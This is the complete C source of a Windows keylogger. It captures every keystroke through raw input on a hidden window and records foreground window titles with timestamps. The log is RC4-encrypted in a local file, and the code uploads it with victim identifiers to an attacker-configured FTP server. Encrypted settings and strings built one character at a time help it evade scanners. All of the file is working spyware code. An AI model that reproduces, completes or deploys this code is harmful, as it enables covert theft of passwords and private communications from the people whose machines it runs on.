
#include "keylogger.h"

uint32_t lastLogEventTS = 0;
uint32_t lastLogEventSavedTS = 0;
uint64_t lastNetworkRequest = 0;
uint32_t lastTitleCrc32 = 0;

int networkProcessing = 0;
void *sendFileArg = NULL;
LogStorage log;

SettingsFunctions sendDataTable[] = {
	{1, DecodeLocalFileSettings, SendToLocalFile },
	{2, DecodeFTPSettings, SendToFtp}
};

void main() {
	HWND hWnd;
	MSG msg;
	WNDCLASSEXA wc;
	size_t lenSettingsBlob;
	void *pSettingsBlob = NULL;
	SettingsCommon *pSettingsCommon;
	fncDecodeSettingsBlob *pDecodeFnc = NULL;
	fncSendData *pSendDataFnc = NULL;
	void *pOptionalSettings = NULL;
	size_t lenOptionalSettings = 0;
	unsigned n = 0;
	wchar_t storageFilePath[] = { L'%',L'L',L'O',L'C',L'A',L'L',L'A',L'P',L'P',L'D',L'A',L'T',L'A',L'%',L'\\',L's',L't',L'r',L'g',L'.',L'b',L'i',L'n',0 };
	do {
		InitTools();
		pSettingsBlob = ReadOverlaySettings(&lenSettingsBlob);
		if (lenSettingsBlob <= sizeof(SettingsCommon)) {
			break;
		}
		pSettingsCommon = (SettingsCommon *)pSettingsBlob;
		for (unsigned n = 0; n < sizeof(sendDataTable)/sizeof(SettingsFunctions); n++) {
			if (sendDataTable[n].id == pSettingsCommon->bSendingWay) {
				pDecodeFnc = sendDataTable[n].fncDecode;
				pSendDataFnc = sendDataTable[n].fncSend;
				break;
			}
		}
		if ((pDecodeFnc == NULL) || (pSendDataFnc == NULL)) {
			break;
		}
		pOptionalSettings = &((char *)pSettingsBlob)[sizeof(SettingsCommon)];
		lenOptionalSettings = lenSettingsBlob - sizeof(SettingsCommon);
		wchar_t *storagePath = ExpandEnvStrW(storageFilePath);
		LogStorageFileLoad(&log, storagePath);
		StorageThreadArgs *pStorageThreadArgs = (StorageThreadArgs *)Malloc(sizeof(StorageThreadArgs));
		pStorageThreadArgs->pLogStorage = &log;
		pStorageThreadArgs->pszStorageFilename = storagePath;
		CreateThread(NULL, 0, StorageThread, pStorageThreadArgs, 0, NULL);
		Sleep(1000);
		NetworkThreadArgs *pNetworkThreadArgs = (NetworkThreadArgs *)Malloc(sizeof(NetworkThreadArgs));
		pNetworkThreadArgs->pLogStorage = &log;
		pNetworkThreadArgs->u32CondTime = pSettingsCommon->uTimeCond;
		pNetworkThreadArgs->u32CondLength = pSettingsCommon->uFileLenCond;
		pNetworkThreadArgs->pSendDataArg = pDecodeFnc(pOptionalSettings, lenOptionalSettings);
		pNetworkThreadArgs->pSendDataFunction = pSendDataFnc;
		CreateThread(NULL, 0, NetworkThread, pNetworkThreadArgs, 0, NULL);
		Memset(&wc, 0, sizeof(WNDCLASSEXA));
		wc.lpszClassName = "MEHCK";
		wc.lpfnWndProc = WndProc;
		wc.hInstance = GetModuleHandle(NULL);
		wc.cbSize = sizeof(WNDCLASSEXA);
		RegisterClassExA(&wc);
		hWnd = CreateWindowEx(0, wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
		while (GetMessage(&msg, NULL, 0, 0) > 0) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		Sleep(INFINITE);
	} while (0);
	ExitProcess(0);
}

int FillLoggerEvent(HWND hWnd, LoggerEvent *pEvent) {
	int res = 0;
	DWORD dwLen = 0;
	wchar_t *pwszTitle = NULL;
	do {
		if (pEvent == NULL) {
			break;
		}
		dwLen = GetWindowTextLengthW(hWnd);
		if (dwLen) {
			pwszTitle = (wchar_t *)Malloc((dwLen + 1) * sizeof(wchar_t));
			if (pwszTitle == NULL) {
				break;
			}
			GetWindowTextW(hWnd, pwszTitle, dwLen+1);
		}
		else {
			pwszTitle = StrdupW(L"UNKNOWN");
			if (pwszTitle == NULL) {
				break;
			}
		}
		pEvent->pwszWindowTitle = pwszTitle;
		GetLocalTime(&pEvent->time);
	} while (0);
	return(res);
}

int DumpEvent(LoggerEvent *pEvent) {
	uint32_t temp = 0;
	int res = 0;
	char buff[0x40];
	do {
		if (pEvent == NULL) {
			break;
		}
		DStr dstrTemp;
		Memset(&dstrTemp, 0, sizeof(DStr));
		DStrCreate(&dstrTemp, 0);
		if (pEvent->pwszWindowTitle != NULL) {
			temp = Crc32(pEvent->pwszWindowTitle, StrlenW(pEvent->pwszWindowTitle) * sizeof(wchar_t));
			if (lastTitleCrc32 != temp) {
				wsprintfA(buff, "\r\n[DATE: %d.%d.%d TIME: %d:%d:%d TITLE: ", pEvent->time.wYear, pEvent->time.wMonth, pEvent->time.wDay, pEvent->time.wHour, pEvent->time.wMinute, pEvent->time.wSecond);
				DStrUtf8CatA(&dstrTemp, buff);
				DStrUtf8CatW(&dstrTemp, pEvent->pwszWindowTitle);
				DStrUtf8CatA(&dstrTemp, "]\r\n");
				lastTitleCrc32 = temp;
			}
		}
		DStrUtf8CatW(&dstrTemp, pEvent->wszKey);
		DStrAppend(&log.dstrLog, dstrTemp.pStorage, dstrTemp.len);
		res = 1;
		DStrDestroy(&dstrTemp);
	} while (0);
	return(res);
}

int DestroyEvent(LoggerEvent *pEvent) {
	int res = 0;
	do {
		if (pEvent == NULL) {
			break;
		}
		if (pEvent->pwszWindowTitle != NULL) {
			Free(pEvent->pwszWindowTitle);
		}
		Memset(pEvent, 0, sizeof(LoggerEvent));
		res = 1;
	} while (0);
	return(res);
}

void DumpKey(UINT vKey) {
	LoggerEvent eventKey;
	HWND hWnd = NULL;
	DWORD dwThreadId;
	BYTE kbdState[0x100];
	HKL layout;
	UINT wScanCode;
	int len;
	hWnd = GetForegroundWindow();
	FillLoggerEvent(hWnd, &eventKey);
	Memset(eventKey.wszKey, 0, sizeof(eventKey.wszKey));
	eventKey.wEventType = LOGGER_EVENT_KEYBOARD;
	dwThreadId = GetWindowThreadProcessId(hWnd, NULL);
	layout = GetKeyboardLayout(dwThreadId);
	AttachThreadInput(dwThreadId, GetCurrentThreadId(), TRUE);
	GetKeyboardState(kbdState);
	AttachThreadInput(dwThreadId, GetCurrentThreadId(), FALSE);
	wScanCode = MapVirtualKeyEx(vKey, MAPVK_VK_TO_VSC, layout);
	if (!ToUnicodeEx(vKey, wScanCode, kbdState, eventKey.wszKey, (sizeof(eventKey.wszKey)/sizeof(wchar_t))-1 , 0, layout) || 
		(eventKey.wszKey[1] == 0 && eventKey.wszKey[0] < 0x20)) {
		eventKey.wszKey[0] = L'[';
		len = GetKeyNameTextW(MAKELONG(0, wScanCode), &eventKey.wszKey[1], sizeof(eventKey.wszKey)-0x2);
		eventKey.wszKey[len + 1] = ']';
		eventKey.wszKey[len + 2] = 0;
	}
	DumpEvent(&eventKey);
	DestroyEvent(&eventKey);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {
	case WM_CREATE: {
		RAWINPUTDEVICE rid;
		rid.dwFlags = RIDEV_NOLEGACY | RIDEV_INPUTSINK | RIDEV_NOHOTKEYS;
		rid.usUsagePage = 1;
		rid.usUsage = 6;
		rid.hwndTarget = hWnd;
		RegisterRawInputDevices(&rid, 1, sizeof(rid));
		break;
	}
	case WM_INPUT: {
		uint32_t dwSize = 0;
		RAWINPUT *pInputBuf = NULL;
		do {
			if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER)) == -1) {
				break;
			}
			pInputBuf = (RAWINPUT *)Malloc(dwSize);
			if (pInputBuf == NULL) {
				break;
			}
			if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, pInputBuf, &dwSize, sizeof(RAWINPUTHEADER)) == -1) {
				break;
			}
			if (pInputBuf->header.dwType == RIM_TYPEKEYBOARD && pInputBuf->data.keyboard.Message == WM_KEYDOWN) {
				DumpKey(pInputBuf->data.keyboard.VKey);
			}
		} while (0);
		if (pInputBuf != NULL) {
			Free(pInputBuf);
			pInputBuf = NULL;
		}
	}
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

void *ReadOverlaySettings(size_t *pLen) {
	char key[] = { 'N','0','S','s','1','o','B' };
	void *pOverlay = NULL;
	size_t lenOverlay = 0;
	void *pSettings = NULL;
	size_t lenSettings = 0;
	do {
		if (pLen == NULL) {
			break;
		}
		pOverlay = ReadOverlay(&lenOverlay);
		if (pOverlay == NULL || lenOverlay <= 4) {
			break;
		}
		if (*(uint32_t *)pOverlay != Crc32(&((char *)pOverlay)[4], lenOverlay-0x4)) {
			break;
		}
		lenSettings = lenOverlay - 0x4;
		if ((pSettings = Malloc(lenSettings)) == NULL) {
			break;
		}
		RC4(&((unsigned char *)pOverlay)[4], lenSettings, (unsigned char *)key, sizeof(key), (unsigned char *)pSettings);
		*pLen = lenSettings;
	} while (0);
	if (pOverlay != NULL) {
		Free(pOverlay);
		pOverlay = NULL;
	}
	return(pSettings);
}

int LogStorageFileSave(LogStorage *pLogStorage, wchar_t *szFilename) {
	int res = 0;
	void *pBlob = NULL;
	size_t lenBlob = 0;
	HANDLE hFile = NULL;
	DWORD dwWritten = 0;
	do {
		if (pLogStorage == NULL || szFilename == NULL) {
			break;
		}
		if ((pBlob = LogStorageSave(pLogStorage, &lenBlob)) == NULL) {
			break;
		}
		hFile = CreateFileW(szFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
			break;
		}
		if (!WriteFile(hFile, pBlob, lenBlob, &dwWritten, NULL) || (lenBlob != dwWritten)) {
			break;
		}
		res = 1;
	} while (0);
	if (hFile != NULL && hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		hFile = NULL;
	}
	if (pBlob != NULL) {
		Free(pBlob);
		pBlob = NULL;
	}
	return(res);
}

int LogStorageFileLoad(LogStorage *pLogStorage, wchar_t *szFilename) {
	HANDLE hFile = NULL;
	int res = 0;
	LARGE_INTEGER li;
	void *pBlob = NULL;
	size_t lenBlob = 0;
	DWORD dwRead = 0;
	do {
		if (pLogStorage == NULL || szFilename == NULL) {
			break;
		}
		hFile = CreateFileW(szFilename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
			break;
		}
		if (!GetFileSizeEx(hFile, &li) || li.LowPart == 0 || li.HighPart > 0) {
			break;
		}
		lenBlob = li.LowPart;
		if ((pBlob = Malloc(li.QuadPart)) == NULL) {
			break;
		}
		if (!ReadFile(hFile, pBlob, lenBlob, &dwRead, NULL)  || (dwRead != lenBlob)) {
			break;
		}
		res = LogStorageCreate(pLogStorage, (LogStorageBlob *)pBlob, lenBlob);
	} while (0);
	if (hFile != NULL && hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		hFile = NULL;
	}
	if (pBlob != NULL) {
		Free(pBlob);
		pBlob = NULL;
	}
	return(res);
}

int LogStorageCreate(LogStorage *pLogStorage, LogStorageBlob *pLogStorageBlob, size_t lenLogStorageBlob) {
	unsigned char *pTemp = NULL;
	int res = 0;
	union {
		unsigned char u8[8];
		uint64_t u64;
	} key;
	do {
		if (pLogStorage == NULL) {
			break;
		}
		InitializeCriticalSection(&pLogStorage->cs);
		DStrCreate(&pLogStorage->dstrLog, 0);
		if (pLogStorageBlob == NULL) {
			if (lenLogStorageBlob == 0) {
				res = 1;
			}
			break;
		}
		if (lenLogStorageBlob < sizeof(LogStorageBlob)) {
			break;
		}
		if (Crc32(&pLogStorageBlob->lastNetworkRequest, lenLogStorageBlob - 0x4) != pLogStorageBlob->u32CheckSum) {
			break;
		}
		pLogStorage->lastRequestTimestamp = pLogStorageBlob->lastNetworkRequest;
		size_t lenLog = lenLogStorageBlob - sizeof(LogStorageBlob);
		if (lenLog == 0) {
			res = 1;
			break;
		}
		if ((pTemp = (unsigned char *)Malloc(lenLog)) == NULL) {
			break;
		}
		key.u64 = GetBotId();
		RC4(&pLogStorageBlob->logs[0], lenLog, key.u8, 0x8, pTemp);
		res = DStrAppend(&pLogStorage->dstrLog, pTemp, lenLog);
		Free(pTemp);
	} while (0);
	return(res);
}

void *LogStorageSave(LogStorage *pLogStorage, size_t *pSize) {
	LogStorageBlob *pBlob = NULL;
	size_t lenBlob = 0;
	union {
		unsigned char u8[8];
		uint64_t u64;
	} key;
	do {
		if (pLogStorage == NULL || pSize == NULL) {
			break;
		}
		key.u64 = GetBotId();
		EnterCriticalSection(&pLogStorage->dstrLog.cs);
		do {
			lenBlob = pLogStorage->dstrLog.len;
			pBlob = (LogStorageBlob *)Malloc(sizeof(LogStorageBlob)+lenBlob);
			if (pBlob == NULL) {
				break;
			}
			pBlob->lastNetworkRequest = pLogStorage->lastRequestTimestamp;
			if (lenBlob > 0) {
				RC4((unsigned char *)pLogStorage->dstrLog.pStorage, lenBlob, key.u8, 0x8, pBlob->logs);
			}
			lenBlob += sizeof(LogStorageBlob);
			pBlob->u32CheckSum = Crc32(&pBlob->lastNetworkRequest, lenBlob - 0x4);
			*pSize = lenBlob;
		} while (0);
		LeaveCriticalSection(&pLogStorage->dstrLog.cs);
	} while (0);
	return(pBlob);
}


uint64_t LogStorageGetLastRequestTimestamp(LogStorage *pLogStorage) {
	uint64_t res = 0;
	do {
		if (pLogStorage == NULL) {
			break;
		}
		EnterCriticalSection(&pLogStorage->cs);
		res = pLogStorage->lastRequestTimestamp;
		LeaveCriticalSection(&pLogStorage->cs);
	} while (0);
	return(res);
}

uint64_t LogStorageLastRequestUpdate(LogStorage *pLogStorage) {
	uint64_t res = 0;
	do {
		if (pLogStorage == NULL) {
			break;
		}
		EnterCriticalSection(&pLogStorage->cs);
		pLogStorage->lastUpadateTick = GetTickCount64();
		pLogStorage->lastRequestTimestamp = res = GetUnixTime();
		LeaveCriticalSection(&pLogStorage->cs);
	} while (0);
	return(res);
}

uint64_t LogStorageGetLastUpdateTick(LogStorage *pLogStorage) {
	uint64_t res = 0;
	do {
		if (pLogStorage == NULL) {
			break;
		}
		EnterCriticalSection(&pLogStorage->cs);
		res = pLogStorage->lastUpadateTick;
		LeaveCriticalSection(&pLogStorage->cs);
	} while (0);
	return(res);
}

uint64_t LogStorageUpdate(LogStorage *pLogStorage) {
	uint64_t res = 0;
	do {
		if (pLogStorage == NULL) {
			break;
		}
		EnterCriticalSection(&pLogStorage->cs);
		res = pLogStorage->lastUpadateTick = GetTickCount64();
		LeaveCriticalSection(&pLogStorage->cs);
	} while (0);
	return(res);
}

DWORD WINAPI StorageThread(LPVOID lpParam) {
	StorageThreadArgs *pArgs = (StorageThreadArgs *)lpParam;
	uint64_t lastRequestTick = LogStorageGetLastUpdateTick(pArgs->pLogStorage);
	uint64_t tempTick = 0;
	while (TRUE) {
		Sleep(10000);
		tempTick = LogStorageGetLastUpdateTick(pArgs->pLogStorage);
		if (lastRequestTick != tempTick) {
			lastRequestTick = tempTick;
			LogStorageFileSave(pArgs->pLogStorage, pArgs->pszStorageFilename);
		}
	}
}

DWORD WINAPI NetworkThread(LPVOID lpParam) {
	NetworkThreadArgs *pArgs = (NetworkThreadArgs *)lpParam;
	uint32_t len = 0;
	uint64_t ts = 0;
	DStr temp;
	while (TRUE) {
		do {
			DStrGetLen(&pArgs->pLogStorage->dstrLog, &len);
			ts = LogStorageGetLastRequestTimestamp(pArgs->pLogStorage);
			if (len) {
				if (pArgs->u32CondLength > 0 && len >= pArgs->u32CondLength) {
					break;
				}
				if (pArgs->u32CondTime > 0 && (GetUnixTime() - ts) >= pArgs->u32CondTime) {
					break;
				}
			}
			Sleep(1000);
		} while (TRUE);
		Memset(&temp, 0, sizeof(temp));
		DStrClone(&temp, &pArgs->pLogStorage->dstrLog);
		if (pArgs->pSendDataFunction(temp.pStorage, temp.len, pArgs->pSendDataArg)) {
			DStrSkip(&pArgs->pLogStorage->dstrLog, temp.len);
			LogStorageLastRequestUpdate(pArgs->pLogStorage);
		}
		DStrDestroy(&temp);
	}
	return(0);
}

int MakeHeader(DStr *pDStrHeader) {
	char *temp = NULL;
	wchar_t wszBuff[0x100];
	SYSTEM_INFO sysinfo;
	DWORD dwTemp = 0;
	int ret = 0;
	do {
		if (pDStrHeader == NULL) {
			break;
		}
		DStrUtf8CatA(pDStrHeader, "ID: ");
		wsprintfW(wszBuff, L"%I64X", GetBotId());
		DStrUtf8CatW(pDStrHeader, wszBuff);
		DStrUtf8CatA(pDStrHeader, temp);
		Free(temp);
		temp = NULL;
		DStrUtf8CatA(pDStrHeader, "\r\nUser: ");
		dwTemp = 0x100;
		if (!GetUserNameW(wszBuff, &dwTemp)) {
			break;
		}
		DStrUtf8CatW(pDStrHeader, wszBuff);
		DStrUtf8CatA(pDStrHeader, "\r\nComputer name: ");
		dwTemp = 0x100;
		if (!GetComputerNameW(wszBuff, &dwTemp)) {
			break;
		}
		DStrUtf8CatW(pDStrHeader, wszBuff);
		Free(temp);
		temp = NULL;
		DStrUtf8CatA(pDStrHeader, "\r\nOS: ");
		temp = GetOSVersionString();
		if (temp == NULL) {
			break;
		}
		DStrUtf8CatA(pDStrHeader, temp);
		Free(temp);
		temp = NULL;
		DStrUtf8CatA(pDStrHeader, "\r\nCPU Arch: ");
		GetNativeSystemInfo(&sysinfo);
		switch (sysinfo.wProcessorArchitecture) {
		case PROCESSOR_ARCHITECTURE_AMD64:
			temp = "x86-64";
			break;
		case PROCESSOR_ARCHITECTURE_ARM:
			temp = "ARM";
			break;
		case PROCESSOR_ARCHITECTURE_ARM64:
			temp = "ARM64";
			break;
		case PROCESSOR_ARCHITECTURE_INTEL:
			temp = "x86";
			break;
		case PROCESSOR_ARCHITECTURE_IA64:
			temp = "IA64";
			break;
		default:
			temp = "UNKNOWN";
		}
		DStrUtf8CatA(pDStrHeader, temp);
		temp = NULL;
		DStrUtf8CatA(pDStrHeader, "\r\n====\r\n");
		ret = 1;
	} while (0);
	return(ret);
}

int WINAPI SendToLocalFile(void *pData, size_t lenData, void *pSettings) {
	int ret = 0;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD dwWritten = 0;
	do {
		if (pData == NULL || lenData == 0 || pSettings == NULL) {
			break;
		}
		hFile = CreateFileW((wchar_t *)pSettings, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
			break;
		}
		if (GetLastError() != ERROR_ALREADY_EXISTS) {
			int ok = 0;
			DStr headerDStr;
			do {
				DStrCreate(&headerDStr, 0);
				MakeHeader(&headerDStr);
				if (headerDStr.len == 0 || headerDStr.pStorage == NULL) {
					break;
				}
				if (!WriteFile(hFile, headerDStr.pStorage, headerDStr.len, &dwWritten, NULL)) {
					break;
				}
				if (headerDStr.len != dwWritten) {
					break;
				}
				ok = 1;
			} while (0);
			DStrDestroy(&headerDStr);
			if (!ok) {
				break;
			}
		}
		SetFilePointer(hFile, 0L, NULL, FILE_END);
		if (!WriteFile(hFile, pData, lenData, &dwWritten, NULL)) {
			break;
		}
		if (lenData != dwWritten) {
			break;
		}
		ret = 1;
	} while (0);
	if (hFile != NULL && hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
		hFile = NULL;
	}
	return(ret);
}

SendToFtpArgs *PrepareFtpArgs(char *szDomain, unsigned uPort, char *szUser, char *szPass) {
	SendToFtpArgs *pArgs = NULL;
	do {
		if (szDomain == NULL || szUser == NULL || szPass == NULL) {
			break;
		}
		if (uPort == 0 || uPort > 65535) {
			break;
		}
		size_t lenDomain = StrlenA(szDomain);
		size_t lenUser = StrlenA(szUser);
		size_t lenPass = StrlenA(szPass);
		pArgs = (SendToFtpArgs *)Malloc(sizeof(SendToFtpArgs) + 3 + lenDomain + lenUser + lenPass);
		if (pArgs == NULL) {
			break;
		}
		pArgs->uPort = uPort;
		char *szBody = pArgs->szBody;
		pArgs->pszDomain = szBody;
		Memcpy(szBody, szDomain, lenDomain);
		szBody[lenDomain] = 0;
		szBody += lenDomain + 1;
		pArgs->pszUser = szBody;
		Memcpy(szBody, szUser, lenUser);
		szBody[lenUser] = 0;
		szBody += lenUser + 1;
		pArgs->pszPass = szBody;
		Memcpy(szBody, szPass, lenPass);
		szBody[lenPass] = 0;
	} while (0);
	return(pArgs);
}

void *WINAPI DecodeLocalFileSettings(void *pBlob, size_t lenBlob) {
	void *pRes = NULL;
	wchar_t *pszTemplate = NULL;
	do {
		if (pBlob == NULL || lenBlob == 0 || lenBlob % 2) {
			break;
		}
		pszTemplate = StrndupW((wchar_t *)pBlob, lenBlob / 2);
		if (pszTemplate == NULL) {
			break;
		}
		pRes = ExpandEnvStrW(pszTemplate);
	} while (0);
	if (pszTemplate != NULL) {
		Free(pszTemplate);
		pszTemplate = NULL;
	}
	return(pRes);
}

void *WINAPI DecodeFTPSettings(void *pBlob, size_t lenBlob) {
	void *pRes = NULL;
	uint16_t wPort = 0;
	char *pszBody = NULL;
	size_t lenBody = 0;
	size_t n = 0;
	char *pHost = NULL;
	char *pUser = NULL;
	char *pPass = NULL;
	do {
		if (pBlob == NULL || lenBlob < 0x8) {
			break;
		}
		wPort = *(uint16_t *)pBlob;
		pszBody = &((char *)pBlob)[2];
		lenBody = lenBlob - 2;
		if (pszBody[lenBody - 1] != 0) {
			break;
		}
		pHost = pszBody;
		n = StrlenA(pszBody)+1;
		pszBody += n;
		lenBody -= n;
		if (lenBody == 0) {
			break;
		}
		pUser = pszBody;
		n = StrlenA(pszBody) + 1;
		pszBody += n;
		lenBody -= n;
		if (lenBody == 0) {
			break;
		}
		pPass = pszBody;
		pRes = PrepareFtpArgs(pHost, wPort, pUser, pPass);
	} while (0);
	return(pRes);
}

int WINAPI SendToFtp(void *pData, size_t lenData, void *pSettings) {
	int res = 0;
	SendToFtpArgs *pArgs = (SendToFtpArgs *)pSettings;
	HINTERNET hInternet = NULL;
	HINTERNET hFtpSession = NULL;
	HINTERNET hFtpFile = NULL;
	DWORD dwWritten = 0;
	DStr headerDStr = {0};
	char szFilename[0x30];
	char szAppendTemplate[] = { 'A','P','P','E',' ','%','I','6','4','X','.','t','x','t',0 };
	char szFilenameTemplate[] = {'%','I','6','4','X','.','t','x','t',0 };
	do {
		if (pData == NULL || lenData == 0 || pSettings == NULL) {
			break;
		}
		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		if (hInternet == NULL) {
			break;
		}
		hFtpSession = InternetConnect(hInternet, pArgs->pszDomain, pArgs->uPort, pArgs->pszUser, pArgs->pszPass, INTERNET_SERVICE_FTP, 0, 0);
		if (hFtpSession == NULL) {
			break;
		}
		wsprintfA(szFilename, szFilenameTemplate, GetBotId());
		hFtpFile = FtpOpenFileA(hFtpSession, szFilename, GENERIC_READ, FTP_TRANSFER_TYPE_BINARY, NULL);
		if (hFtpFile == NULL) {
			DStrCreate(&headerDStr, 0);
			MakeHeader(&headerDStr);
			wsprintfA(szFilename, szAppendTemplate, GetBotId());
			if (!FtpCommandA(hFtpSession, TRUE, FTP_TRANSFER_TYPE_BINARY, szFilename, NULL, &hFtpFile)) {
				break;
			}
			if (!InternetWriteFile(hFtpFile, headerDStr.pStorage, headerDStr.len, &dwWritten) || (headerDStr.len != dwWritten)) {
				break;
			}
		}
		if (hFtpFile != NULL) {
			InternetCloseHandle(hFtpFile);
			hFtpFile = NULL;
		}
		wsprintfA(szFilename, szAppendTemplate, GetBotId());
		if (!FtpCommandA(hFtpSession, TRUE, FTP_TRANSFER_TYPE_BINARY, szFilename, NULL, &hFtpFile)) {
			break;
		}
		if (!InternetWriteFile(hFtpFile, pData, lenData, &dwWritten) || (lenData != dwWritten)) {
			break;
		}
		res = 1;
	} while (0);
	if (hFtpFile != NULL) {
		InternetCloseHandle(hFtpFile);
	}
	if (hFtpSession != NULL) {
		InternetCloseHandle(hFtpSession);
	}
	if (hInternet != NULL) {
		InternetCloseHandle(hInternet);
	}
	DStrDestroy(&headerDStr);
	return(res);
} 
